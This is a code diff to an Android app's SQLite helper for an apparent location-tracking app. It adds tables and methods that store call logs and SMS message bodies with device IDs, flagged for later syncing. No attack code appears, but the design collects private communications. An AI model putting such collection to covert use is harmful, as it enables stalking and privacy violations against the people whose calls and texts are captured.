@@ -9,11 +9,13 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
 
     companion object {
         private const val DATABASE_NAME = "location_tracker.db"
-        private const val DATABASE_VERSION = 11 // 升级到版本 11
+        private const val DATABASE_VERSION = 12 // 升级到版本 12
         private const val TABLE_NAME = "locations"
         private const val TABLE_APPS = "installed_apps"
         private const val TABLE_USAGE = "app_usage_stats"
         private const val TABLE_SESSIONS = "app_session_history"
+        private const val TABLE_CALLS = "call_history"
+        private const val TABLE_SMS = "sms_history"
         
         private const val COL_ID = "id"
         private const val COL_TIMESTAMP = "timestamp"
@@ -37,6 +39,14 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
 
         private const val COL_START_TIME = "start_time"
         private const val COL_DURATION = "duration_s"
+
+        // 通话/短信字段
+        private const val COL_NUMBER = "number"
+        private const val COL_NAME = "name"
+        private const val COL_TYPE = "type"
+        private const val COL_TIME = "time"
+        private const val COL_BODY = "body"
+        private const val COL_ADDRESS = "address"
     }
 
     override fun onCreate(db: SQLiteDatabase) {
@@ -98,18 +108,48 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
                 $COL_IS_SYNCED INTEGER DEFAULT 0
             )
         """.trimIndent())
+
+        db.execSQL("""
+            CREATE TABLE IF NOT EXISTS $TABLE_CALLS (
+                $COL_ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                $COL_NUMBER TEXT,
+                $COL_NAME TEXT,
+                $COL_TYPE TEXT,
+                $COL_TIME TEXT,
+                $COL_DURATION INTEGER,
+                $COL_DEVICE_ID TEXT,
+                $COL_DEVICE_NAME TEXT,
+                $COL_IS_SYNCED INTEGER DEFAULT 0
+            )
+        """.trimIndent())
+
+        db.execSQL("""
+            CREATE TABLE IF NOT EXISTS $TABLE_SMS (
+                $COL_ID INTEGER PRIMARY KEY AUTOINCREMENT,
+                $COL_ADDRESS TEXT,
+                $COL_BODY TEXT,
+                $COL_TYPE TEXT,
+                $COL_TIME TEXT,
+                $COL_DEVICE_ID TEXT,
+                $COL_DEVICE_NAME TEXT,
+                $COL_IS_SYNCED INTEGER DEFAULT 0
+            )
+        """.trimIndent())
     }
 
     override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
-        if (oldVersion < 11) {
+        if (oldVersion < 12) {
             db.execSQL("DROP TABLE IF EXISTS $TABLE_NAME")
             db.execSQL("DROP TABLE IF EXISTS $TABLE_APPS")
             db.execSQL("DROP TABLE IF EXISTS $TABLE_USAGE")
             db.execSQL("DROP TABLE IF EXISTS $TABLE_SESSIONS")
+            db.execSQL("DROP TABLE IF EXISTS $TABLE_CALLS")
+            db.execSQL("DROP TABLE IF EXISTS $TABLE_SMS")
             createAllTables(db)
         }
     }
 
+    // Location
     fun insertRecord(record: LocationRecord): Long {
         val db = writableDatabase
         val values = ContentValues().apply {
@@ -186,6 +226,7 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
         return records
     }
 
+    // Apps
     fun insertApp(app: InstalledApp): Long {
         val db = writableDatabase
         val values = ContentValues().apply {
@@ -226,6 +267,7 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
         return apps
     }
 
+    // Usage
     fun insertUsage(usage: AppUsageRecord): Long {
         val db = writableDatabase
         val values = ContentValues().apply {
@@ -268,6 +310,7 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
         return list
     }
 
+    // Sessions
     fun insertSession(session: AppSessionRecord): Long {
         val db = writableDatabase
         val values = ContentValues().apply {
@@ -300,6 +343,94 @@ class LocalDbHelper(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME,
                     appName = getString(getColumnIndexOrThrow(COL_APP_NAME)),
                     startTime = getString(getColumnIndexOrThrow(COL_START_TIME)),
                     durationSeconds = getLong(getColumnIndexOrThrow(COL_DURATION)),
+                    deviceId = getString(getColumnIndexOrThrow(COL_DEVICE_ID)),
+                    deviceName = getString(getColumnIndexOrThrow(COL_DEVICE_NAME)),
+                    isSynced = getInt(getColumnIndexOrThrow(COL_IS_SYNCED)) == 1
+                ))
+            }
+        }
+        cursor.close()
+        return list
+    }
+
+    // Calls
+    fun insertCall(record: CallRecord): Long {
+        val db = writableDatabase
+        val values = ContentValues().apply {
+            put(COL_NUMBER, record.number)
+            put(COL_NAME, record.name)
+            put(COL_TYPE, record.type)
+            put(COL_TIME, record.time)
+            put(COL_DURATION, record.durationSeconds)
+            put(COL_DEVICE_ID, record.deviceId)
+            put(COL_DEVICE_NAME, record.deviceName)
+            put(COL_IS_SYNCED, if (record.isSynced) 1 else 0)
+        }
+        return db.insert(TABLE_CALLS, null, values)
+    }
+
+    fun markCallSynced(id: Long) {
+        val db = writableDatabase
+        val values = ContentValues().apply { put(COL_IS_SYNCED, 1) }
+        db.update(TABLE_CALLS, values, "$COL_ID = ?", arrayOf(id.toString()))
+    }
+
+    fun getUnsyncedCalls(): List<CallRecord> {
+        val db = readableDatabase
+        val cursor = try { db.query(TABLE_CALLS, null, "$COL_IS_SYNCED = 0", null, null, null, null) } catch (e: Exception) { return emptyList() }
+        val list = mutableListOf<CallRecord>()
+        with(cursor) {
+            while (moveToNext()) {
+                list.add(CallRecord(
+                    id = getLong(getColumnIndexOrThrow(COL_ID)),
+                    number = getString(getColumnIndexOrThrow(COL_NUMBER)),
+                    name = getString(getColumnIndexOrThrow(COL_NAME)),
+                    type = getString(getColumnIndexOrThrow(COL_TYPE)),
+                    time = getString(getColumnIndexOrThrow(COL_TIME)),
+                    durationSeconds = getLong(getColumnIndexOrThrow(COL_DURATION)),
+                    deviceId = getString(getColumnIndexOrThrow(COL_DEVICE_ID)),
+                    deviceName = getString(getColumnIndexOrThrow(COL_DEVICE_NAME)),
+                    isSynced = getInt(getColumnIndexOrThrow(COL_IS_SYNCED)) == 1
+                ))
+            }
+        }
+        cursor.close()
+        return list
+    }
+
+    // SMS
+    fun insertSms(record: SmsRecord): Long {
+        val db = writableDatabase
+        val values = ContentValues().apply {
+            put(COL_ADDRESS, record.address)
+            put(COL_BODY, record.body)
+            put(COL_TYPE, record.type)
+            put(COL_TIME, record.time)
+            put(COL_DEVICE_ID, record.deviceId)
+            put(COL_DEVICE_NAME, record.deviceName)
+            put(COL_IS_SYNCED, if (record.isSynced) 1 else 0)
+        }
+        return db.insert(TABLE_SMS, null, values)
+    }
+
+    fun markSmsSynced(id: Long) {
+        val db = writableDatabase
+        val values = ContentValues().apply { put(COL_IS_SYNCED, 1) }
+        db.update(TABLE_SMS, values, "$COL_ID = ?", arrayOf(id.toString()))
+    }
+
+    fun getUnsyncedSms(): List<SmsRecord> {
+        val db = readableDatabase
+        val cursor = try { db.query(TABLE_SMS, null, "$COL_IS_SYNCED = 0", null, null, null, null) } catch (e: Exception) { return emptyList() }
+        val list = mutableListOf<SmsRecord>()
+        with(cursor) {
+            while (moveToNext()) {
+                list.add(SmsRecord(
+                    id = getLong(getColumnIndexOrThrow(COL_ID)),
+                    address = getString(getColumnIndexOrThrow(COL_ADDRESS)),
+                    body = getString(getColumnIndexOrThrow(COL_BODY)),
+                    type = getString(getColumnIndexOrThrow(COL_TYPE)),
+                    time = getString(getColumnIndexOrThrow(COL_TIME)),
                     deviceId = getString(getColumnIndexOrThrow(COL_DEVICE_ID)),
                     deviceName = getString(getColumnIndexOrThrow(COL_DEVICE_NAME)),
                     isSynced = getInt(getColumnIndexOrThrow(COL_IS_SYNCED)) == 1
